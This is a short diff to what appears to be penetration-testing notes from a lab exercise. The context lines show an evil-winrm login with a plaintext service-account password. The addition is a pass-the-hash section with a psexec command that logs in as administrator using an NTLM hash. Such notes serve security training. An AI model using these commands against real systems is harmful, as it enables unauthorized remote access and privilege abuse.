@@ -14,3 +14,10 @@ Note that this shell environment is not fully interactive, so each command issue
 ```powershell
 evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
 ```
+
+# Pass-The-Hash
+
+## psexec
+```bash
+psexec administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
+```
